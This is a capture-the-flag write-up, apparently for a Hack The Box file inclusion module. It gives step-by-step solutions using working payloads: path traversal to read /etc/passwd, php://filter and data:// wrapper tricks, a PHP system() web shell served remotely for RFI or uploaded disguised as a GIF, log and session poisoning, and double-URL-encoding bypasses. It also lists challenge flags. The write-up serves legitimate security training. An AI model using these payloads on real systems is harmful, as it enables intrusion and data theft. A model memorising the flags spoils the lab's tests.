# HTB-File_Inclusion

## Table of Contents
0. [Tools](#tools)
1. [File Disclosure](#file-disclosure)
    1. [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
    2. [Basic Bypasses](#basic-bypasses)
    3. [PHP Filters](#php-filters)
2. [Remote Code Execution](#remote-code-execution)
    1. [PHP Wrappers](#php-wrappers)
    2. [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
    3. [LFI and File Uploads](#lfi-and-file-uploads)
    4. [Log Poisoning](#log-poisoning)
3. [Automation and Prevention](#automation-and-prevention)
    1. [Automated Scanning](#automated-scanning)
    2. [File Inclusion Prevention](#file-inclusion-prevention)
4. [Skills Assessment - File Inclusion](#skills-assessment---file-inclusion)

## Tools
1. ffuf

## File Disclosure
### Local File Inclusion (LFI)
#### Challenges
1. Using the file inclusion find the name of a user on the system that starts with "b".

    We can solve this by using path traversal and explore **/etc/passwd**.

    ```url
    http://83.136.255.170:50080/index.php?language=../../../../etc/passwd
    ```
    ![alt text](<Assets/Local File Inclusion (LFI) - 1.png>)

    We can see the answer in the bottom of the image. The answer is `barry`.

2. Submit the contents of the flag.txt file located in the /usr/share/flags directory.

    We can use this payload:

    ```url
    http://83.136.255.170:50080/index.php?language=../../../..//usr/share/flags/flag.txt
    ```

    The answer is `HTB{n3v3r_tru$t_u$3r_!nput}`.

### Basic Bypasses
#### Challenges
1. The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt

    After doig trial and error, i found this as a correct payload:

    ```url
    http://94.237.61.249:34089/index.php?language=languages/....//....//....//....//flag.txt
    ```
    The answer is `HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}`.

### PHP Filters
#### Challenges
1. Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer

    We can use **ffuf** to find other **.php** script.

    ```bash
    ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.56.175:54800/FUZZ.php
    ```

    ![alt text](<Assets/PHP Filters - 1.png>)

    After doing trial and error, the correct file is **configure**. Here the valid url:

    ```url
    http://94.237.56.175:54800/index.php?language=php://filter/read=convert.base64-encode/resource=configure
    ```
    We will get the base64 output. Then, we can decode it by using this command:

    ```bash
    echo 'PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7' | base64 -d
    ```

    The answer is `HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}`.

## Remote Code Execution
### PHP Wrappers
#### Challenges
1. Try to gain RCE using one of the PHP wrappers and read the flag at /

    To solve this, first we need to make sure that PHP Configurations (allow_url_include) is enabled.

    ```bash
    curl "http://94.237.123.236:51805/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
    ```

    We can copy the base64 output and decode it by using this command:

    ```bash
    echo '<base64>' | base64 -d | grep allow_url_include
    ```

    ![alt text](<Assets/PHP Wrappers - 1.png>)

    We can see that allow_url_include is enabled. Now, we can use data:// wrapper to execute command. Here the command to find the flag:

    ```bash
    curl -s 'http://94.237.123.236:51805/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls%20%2F'
    ```
    We will find the flag at `/37809e2f8952f06139011994726d9ef1.txt`. Then, we can use this command to get the flag:

    ```bash 
    curl -s 'http://94.237.123.236:51805/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20%2F37809e2f8952f06139011994726d9ef1.txt'
    ```
    The answer is **HTB{d!$46l3_r3m0t3_url_!nclud3}**.

### Remote File Inclusion (RFI)
#### Challenges
1. Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /

    First, we need to create the payload.

    ```bash
    echo '<?php system($_GET["cmd"]); ?>' > shell.php
    ```
    Then, we need to start a web server.

    ```bash
    python3 -m http.server 443 --bind 10.10.15.105
    ```
    After doing some exploration, we can find the flag at `/exercise/flag.txt`. Here the command to read the flag:

    ```bash
    curl 'http://10.129.29.114/index.php?language=http://10.10.15.105:443/shell.php&cmd=cat%20%2Fexercise%2Fflag.txt'
    ```
    The answer is **99a8fc05f033f2fc0cf9a6f9826f83f4**.

### LFI and File Uploads
#### Challenges
1. Use any of the techniques covered in this section to gain RCE and read the flag at /

    We can solve this by uploading our shellcode into our profile picture with GIF format. Here the payload:

    ```bash
    echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
    ```
    Then, after doing some exploration, we can find the flag at `/2f40d853e2d4768d87da1c81772bae0a.txt`. Here the command to read the flag:

    ```bash
    curl 'http://94.237.120.137:34149/index.php?language=./profile_images/shell.gif&cmd=cat%20%2F2f40d853e2d4768d87da1c81772bae0a.txt'
    ```
    The answer is **HTB{upl04d+lf!+3x3cut3=rc3}**.

### Log Poisoning
#### Challenges
1. Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd

    We can solve this by using session poisoning. First, we need to find value of our session id. In here, my session id is **sess_kqbgtugharvo8jb8u1khf39r0j**. Then we can view it is content by using this url:

    ```bash
    http://83.136.252.32:50354/index.php?language=/var/lib/php/sessions/sess_kqbgtugharvo8jb8u1khf39r0j
    ```
    ![alt text](<Assets/Log Poisoning - 1.png>)
        
    We can see that the website took whatever we typed in **?language=** and wrote it directly into this file on the hard drive. We can test it by changing the **?language=** to whatever we want. For example, we can change it to **<?php system($_GET["cmd"]); ?>** to execute command.

    ```bash
    http://83.136.252.32:50354/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
    ```
    Then, we can view the content of the file by using this url:

    ```bash
    http://83.136.252.32:50354/index.php?language=/var/lib/php/sessions/sess_kqbgtugharvo8jb8u1khf39r0j&cmd=pwd
    ```

    The answer is **/var/www/html**.

2. Try to use a different technique to gain RCE and read the flag at /

    We can solve this by using log poisoning. We can intercept the request with burp suite and look the result of changing language to **language=/var/log/apache2/access.log**.

    ![alt text](<Assets/Log Poisoning - 2.png>)
    
    As we can see that we can read the content of access.log. We can try to inject our payload into the log file by changing the **User-Agent** section to **<?php system($_GET["cmd"]); ?>**.

    ![alt text](<Assets/Log Poisoning - 3.png>)

    Now, access.log should be contain our payload. We can use LFI to gain RCE.

    ![alt text](<Assets/Log Poisoning - 4.png>)

    We can see the name of the flag file. We can cat it and get the flag. The answer is **HTB{1095_5#0u1d_n3v3r_63_3xp053d}**.

## Automation and Prevention
### Automated Scanning
#### Challenges
1. Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt

    First, we need to find the correct GET parameter. We can use **ffuf** to do this.

    ```bash
    ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.120.137:46330/index.php?FUZZ=value' -fs 2309
    ```

    ![alt text](<Assets/Automated Scanning - 1.png>)

    We can see that the correct GET parameter is **view**. Now, we can try to fuzz the valid value of **view=FUZZ** parameter.

    ```bash
    ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.120.137:46330/index.php?view=FUZZ' -fs 2309
    ```
    ![alt text](<Assets/Automated Scanning - 2.png>)

    We can use one of them and change **/etc/passwd** to **/flag.txt**. The answer is **HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}**.

### File Inclusion Prevention
#### Challenges
1. What is the full path to the php.ini file for Apache?

    We can use this command to find the full path to the php.ini file for Apache:

    ```bash
    sudo find / -name php.ini
    ```
    The answer is **/etc/php/7.4/apache2/php.ini**.

2. Edit the php.ini file to block system(), then try to execute PHP Code that uses system. Read the /var/log/apache2/error.log file and fill in the blank: system() has been disabled for ________ reasons.

    We can open the php.ini file and edit it. Press Ctrl+W and type disable_functions. Then, we can add **system** to the list of disabled functions. After that, we can restart the Apache server.

    ```bash
    sudo systemctl restart apache2
    ```
    Then, we create the php file in the web root that contain disbaled system function.

    ```bash
    echo '<?php system("id"); ?>' | sudo tee /var/www/html/shell.php
    ```
    After that, we can try to access the file.

    ```bash
    curl http://localhost/shell.php
    ```
    Once we done that, we can see the error log.

    ```bash
    grep "system" /var/log/apache2/error.log
    ```
    ![alt text](<Assets/File Inclusion Prevention - 1.png>)

    The answer is **security**.

## Skills Assessment - File Inclusion
1. Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.

    First, we need to explore the website. I found an interesting endpoint at **/apply.php**. In there, we can upload an file. So i suspected we can gain remote code execution by uploading a file. I uploaded "uploads.docx" that contain "tes". Since we dont know where the file is stored, we can try to fuzz to locate the file.

    ```bash
    ffuf -w /opt/useful/seclists/Discovery/Web-Content/raft-small-directories.txt -u http://83.136.255.53:58119/FUZZ/upload.docx -fs 3405
    ```
    ![alt text](<Assets/Skills Assessment - 1.png>)

    But unfortunatly, we cant reach both of them due to authorization error. When i tried to inspect the page, i found something.

    ![alt text](<Assets/Skills Assessment - 2.png>)

    The file is called from **/api/image.php?p=<filename>**. Not only that, we can see that **/api/application.php** endpoint is handling file upload. Based on that, i tried to find a way to read the source code of both of them. I found this vuln after doing some research:

    ```bash
    curl 'http://83.136.255.53:58119/api/image.php?p=....//....//....//....//....//....//....//....//....//etc/passwd'
    ```

    ![alt text](<Assets/Skills Assessment - 3.png>)
    
    We can use that vuln to read the source code of **/api/image.php**, **/api/application.php** and **/contact.php**.

    ```bash
    curl 'http://83.136.255.53:58119/api/image.php?p=....//api/application.php'
    curl 'http://83.136.255.53:58119/api/image.php?p=....//api/image.php'
    curl 'http://83.136.255.53:58119/api/image.php?p=....//contact.php'
    ```
    ![alt text](<Assets/Skills Assessment - 4.png>)

    We can get these information from the source code. 
    1. **/api/image.php** 
        The api/image.php file uses file_get_contents(), not include(). file_get_contents reads text. It does not execute PHP.
    2. **/api/application.php** 
        The code does not check if the extension is .pdf or .docx. It accepts anything. It renames uploaded file to the MD5 hash of its content.
    3. **/contact.php** 
        In here, region paramater has LFI vuln. The script checks for dangerous characters (. and /) before it fully processes the input. After the check passes, the script manually runs urldecode(). This converts URL-encoded characters (like %2e) back into their real characters (like .). But, if we Double URL Encode (%252e%252e%252f), it will pass the check.
        

    Now, we can prepare the payload. We can use this payload: 

    ```bash
    echo '<?php system($_GET["cmd"]); ?>' > shell.php
    ```
    Once we have uploaded the payload, we can try to access it by calculating the md5 hash of the file.

    ```bash
    md5sum shell.php
    ```
    We got this md5sum, fc023fcacb27a7ad72d605c4e300b389. Now, we can try to test it.

    ```bash
    curl "http://94.237.53.219:31125/contact.php?region=%252e%252e%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&cmd=id"
    ```
    ![alt text](<Assets/Skills Assessment - 5.png>)
    
    It success get the id. Now, we can try to read the flag.

    ```bash
    curl "http://94.237.53.219:31125/contact.php?region=%252e%252e%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&cmd=ls%20%2F"
    curl "http://94.237.53.219:31125/contact.php?region=%252e%252e%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&cmd=cat%20%2Fflag_09ebca.txt"
    ```
    The answer is **eedbb78d4800aa45573840ed6bd2d1e3**.